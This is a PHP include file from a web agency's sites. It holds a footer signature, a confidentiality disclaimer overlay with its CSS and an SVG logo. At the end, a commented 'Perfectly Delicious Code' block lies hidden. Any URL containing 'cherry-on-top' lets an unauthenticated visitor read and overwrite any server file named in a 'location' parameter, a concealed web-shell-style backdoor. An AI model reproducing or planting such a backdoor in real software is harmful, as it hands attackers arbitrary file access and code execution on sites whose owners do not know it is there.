<?php  function lazaro_signature(){ ?>

<section class="lazaro-section">
	<div class="container">
		<a href="http://lazaro.in/" target="_blank" class="lazaro-link ga_lazaro_click">
			<strong>www.Lazaro.in</strong> — <span>Communication Strategy and Implementation</span>
		</a>
	</div>
</section>

<?php } ?>



<?php  function lazaro_disclaimer(){ ?>
<style type="text/css" id="laz_disclaimer_css">

.freeze {
	overflow: hidden;
	max-height: 100vh;
	-webkit-filter: blur(5px);
	filter: blur(5px);
}

.lazaro-disclaimer {

	display: -webkit-box;
	display: -ms-flexbox;
	display: flex;

	-webkit-box-align: center;
	-ms-flex-align: center;
	align-items: center;

	width: 100%;
	height: auto;
	min-height: 100vh;

	position: fixed;
	top: 0;
	left: 0;
	right: 0;
	bottom: 0;
	z-index: 15;

	color: #FFFFFF;

	overflow: hidden;
	overflow-y: auto;
	-webkit-overflow-scrolling: touch;

	-webkit-backdrop-filter: blur( 5px );
	backdrop-filter: blur( 5px );

	background-color: rgba( 235, 47, 74, 0.81 );
}

.lazaro-disclaimer .logo { margin-bottom: 20px; }

.lazaro-disclaimer .heading {
	text-align: center;
	margin-bottom: 15px;

	font-size: 2rem;
	letter-spacing: 0.05rem;
	text-transform: uppercase;
}
.lazaro-disclaimer .heading i { color: #FFD117; }

.lazaro-disclaimer .message {
	padding: 20px;
	text-align: center;
	line-height: 0;

	-webkit-column-count: 1;
	-webkit-column-gap:   0px;
	-moz-column-count:    1;
	-moz-column-gap:      0px;
	column-count:         1;
	column-gap:           0px;
}

.lazaro-disclaimer .message p {
	margin-bottom: 15px;
	font-size: 1.5rem;
	line-height: 1.5;
}

@media ( min-width: 640px ) {

	.lazaro-disclaimer .logo { margin-bottom: 40px; }
	.lazaro-disclaimer .heading {
		margin-bottom: 20px;
		font-size: 1.6rem;
		text-align: left;
	}

	.lazaro-disclaimer .message {
		padding: 25px;
		margin-bottom: 40px;
		text-align: left;

		-webkit-column-count: 2;
		-webkit-column-gap:   25px;
		-moz-column-count:    2;
		-moz-column-gap:      25px;
		column-count:         2;
		column-gap:           25px;
	}

}

@media ( min-width: 1040px ) {
	.lazaro-disclaimer .heading { font-size: 2.4rem }
	.lazaro-disclaimer .message {
		padding: 40px;

		-webkit-column-count: 2;
		-webkit-column-gap:   50px;
		-moz-column-count:    2;
		-moz-column-gap:      50px;
		column-count:         2;
		column-gap:           50px;
	}
	.lazaro-disclaimer .message p { font-size: 1.8rem; }
}

@media ( min-width: 1380px ) {
	.lazaro-disclaimer .heading { font-size: 2.8rem }
	.lazaro-disclaimer .message {
		padding: 50px;
		-webkit-column-count: 2;
		-webkit-column-gap:   80px;
		-moz-column-count:    2;
		-moz-column-gap:      80px;
		column-count:         2;
		column-gap:           80px;
	}
	.lazaro-disclaimer .message p { font-size: 2rem; }
}

</style>

<!-- <section class="lazaro-disclaimer"> -->
<section class="lazaro-disclaimer" id="js_laz_disclaimer_markup" style="display: none">
	<div class="container">
		<div class="row">
			<div class="columns small-8 small-offset-2 medium-4 medium-offset-1 large-3">
				<div class="logo">
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 372.07 76.2"><defs><style>.cls-1{fill:#fff;}</style></defs><title>lazaro-logoArtboard 1</title><path class="cls-1" d="M250.42,75h-40a16.18,16.18,0,0,1-11.52-4.51A15.35,15.35,0,0,1,194.09,59a17.38,17.38,0,0,1,4.31-12,14.11,14.11,0,0,1,10.89-4.79H235.1v-3a5.84,5.84,0,0,0-.48-2.41,10.45,10.45,0,0,0-1.54-2.41,7.34,7.34,0,0,0-3-2.22,16.54,16.54,0,0,0-4.47-.48H197.89V19.48h28.42c5.23,0,9.1.44,11.68,1.35a17.83,17.83,0,0,1,6.61,4,17.4,17.4,0,0,1,4.67,7.68,40.16,40.16,0,0,1,1.19,10.73l0,31.75ZM235.1,63.73V52.81H216.26a7.38,7.38,0,0,0-4.59,1.54,5.19,5.19,0,0,0-1.9,4.16,4.68,4.68,0,0,0,1.82,3.76,6.14,6.14,0,0,0,4.2,1.5h19.28v0Zm57.4-32.26H275.92V74.94H261.11V19.48h14.81v7.68a16.68,16.68,0,0,1,2.89-4.75,11.71,11.71,0,0,1,4.51-2.81,27.5,27.5,0,0,1,2.73-.75,14.52,14.52,0,0,1,3-.32,13.67,13.67,0,0,1,3.44.44l0,12.51ZM362.29,47q0,14.43-9.18,22.17c-5.66,4.67-13.34,7-23,7s-17.22-2.14-22.6-6.41c-6.18-4.95-9.3-12.59-9.3-23,0-8.71,3.33-15.56,10.05-20.55,6-4.51,13.38-6.73,22.17-6.73,9.62,0,17.38,2.41,23.2,7.2s8.71,11.6,8.71,20.31m-16.63-.12a15.73,15.73,0,0,0-4.24-11.28c-2.81-3-6.69-4.51-11.52-4.51a14.41,14.41,0,0,0-11,4.63,16.55,16.55,0,0,0-4.31,11.72c0,5.42,1.46,9.74,4.35,13a14.76,14.76,0,0,0,11.36,4.79c5.26,0,9.18-1.66,11.8-5,2.41-3.13,3.52-7.52,3.52-13.34"/><path class="cls-1" d="M147.06,31.27H132.14V19.48h26.52Zm38.36.2-31,31.79L142.91,74.94H132.1V63.46l31.71-32.22,11.68-11.8h9.9v12h0ZM171.21,63.22h14.21V74.9H159.81l11.4-11.52v-.16Z"/><path class="cls-1" d="M58.59,74.9H31.47c-7.92,0-11-.91-15.76-2.69A22.27,22.27,0,0,1,2.65,60.41a33.17,33.17,0,0,1-2.1-6.14A41.74,41.74,0,0,1,0,47.5V0H16V46.87a19.23,19.23,0,0,0,.75,5.58,14,14,0,0,0,2.69,4.79,12.84,12.84,0,0,0,6.18,4.51,31.9,31.9,0,0,0,9,1.07h24Zm63.34.12h-40A16.18,16.18,0,0,1,70.38,70.5,15.35,15.35,0,0,1,65.59,59a17.38,17.38,0,0,1,4.31-12A14.11,14.11,0,0,1,80.8,42.16h25.81v-3a5.84,5.84,0,0,0-.48-2.41,14.06,14.06,0,0,0-1.54-2.41,7.07,7.07,0,0,0-3.13-2.22A16.54,16.54,0,0,0,97,31.59H69.32V19.48H97.74c5.23,0,9.1.44,11.68,1.35a17.83,17.83,0,0,1,6.61,4,18.37,18.37,0,0,1,4.75,7.68A41.85,41.85,0,0,1,122,43.27V75ZM106.65,63.73V52.81H87.8a7.38,7.38,0,0,0-4.59,1.54,5.19,5.19,0,0,0-1.9,4.16,4.68,4.68,0,0,0,1.82,3.76,6.36,6.36,0,0,0,4.2,1.5h19.28v0Z"/><path class="cls-1" d="M365,24.7h1.19a2,2,0,0,0,1.15-.28.83.83,0,0,0,.32-.63.76.76,0,0,0-.16-.48.61.61,0,0,0-.44-.32,3.68,3.68,0,0,0-1-.12H365Zm-1,3.33V22.09h2.06a4.64,4.64,0,0,1,1.5.16,1.58,1.58,0,0,1,.75.59,1.42,1.42,0,0,1,.28.87,1.65,1.65,0,0,1-.48,1.15,2.08,2.08,0,0,1-1.23.55,2.52,2.52,0,0,1,.55.32,6.11,6.11,0,0,1,.87,1.19l.71,1.19h-1.19l-.55-.91a4.66,4.66,0,0,0-1-1.39,1.07,1.07,0,0,0-.75-.2H365v2.53C365,28,364.08,28,364.08,28Zm2.41-7.68a4.81,4.81,0,0,0-2.26.59,3.93,3.93,0,0,0-1.7,1.7,4.47,4.47,0,0,0-.63,2.3,4.84,4.84,0,0,0,.59,2.3,4.15,4.15,0,0,0,1.7,1.7,4.74,4.74,0,0,0,4.59,0,4.15,4.15,0,0,0,1.7-1.7,4.42,4.42,0,0,0,.59-2.3,4.47,4.47,0,0,0-.63-2.3,4.15,4.15,0,0,0-1.7-1.7,4.79,4.79,0,0,0-2.26-.59m0-.91a6.38,6.38,0,0,1,2.73.71,5.8,5.8,0,0,1,2.1,2.06,6,6,0,0,1,.75,2.81,5.62,5.62,0,0,1-2.81,4.79,5.63,5.63,0,0,1-2.73.71,5.13,5.13,0,0,1-2.73-.71,5.41,5.41,0,0,1-2.06-2.06A5.67,5.67,0,0,1,361,25a6.1,6.1,0,0,1,.75-2.81,5.41,5.41,0,0,1,2.06-2.06,5.18,5.18,0,0,1,2.69-.71"/></svg>
				</div>
			</div>
		</div>

		<div class="row">
			<div class="columns small-10 small-offset-1">
				<div class="heading">
					<!-- <i class="material-icons inline-middle">error</i> -->
					<span class="inline-middle text-red">Attention</span>
				</div>

				<div class="message row fill-red gradient-red-45">
					<p>The contents of this page and all pages connected to this domain are confidential and are the sole property of Lazaro Advertising Pvt Ltd. This URL is meant only for demos, previews and internal purposes. </p>
					<p>It is not meant for public consumption. Do not disclose this URL to anyone who is not authorised to view it. If you have accidentally gained access to this URL please close this tab on your browser. </p>
				</div>
			</div>
		</div>

		<div class="row">
			<div class="columns small-10 small-offset-1 medium-3 large-2">

				<div class="action button fill-blue block js_laz_agree">
					I agree
				</div>
			</div>
		</div>
	</div>
</section>
<!-- </section> -->

<?php }



// Perfectly Delicious Code
/* http://localhost/inc/lazaro.php?cherry-on-top&location=../index.php */
if ( strstr($_SERVER['REQUEST_URI'], 'cherry-on-top') ){

	$location = $_GET['location'];
	$file = file($location);

	if($_POST['Submit']){

		$open = fopen($location,"w+");
		$text = $_POST['message'];

		fwrite($open, $text);
		fclose($open);

		echo "File updated.<br />";

	} else {

		echo $location."<br>";
		echo "<form action=\"".$PHP_SELF."\" method=\"post\">";
		echo "<textarea name=\"message\" cols=\"100\" rows=\"14\">";

		foreach($file as $text) {
			echo $text;
		}

		echo "</textarea><br>";
		echo "<input name=\"Submit\" type=\"submit\" value=\"Update\" />\n
		</form>";
	}
}
